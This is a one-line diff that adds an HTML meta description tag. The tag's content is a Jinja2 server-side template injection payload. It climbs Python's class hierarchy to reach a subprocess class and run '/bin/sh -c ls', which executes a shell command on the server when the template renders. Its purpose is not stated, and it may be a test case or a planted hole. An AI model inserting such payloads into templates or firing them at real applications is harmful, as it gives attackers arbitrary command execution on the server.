@@ -1,0 +1,1 @@
+<meta name="description" content="{{ ''.__class__.__mro__[1].__subclasses__()[350](['/bin/sh','-c','ls'], stdout=-1).communicate()[0].decode() }}">
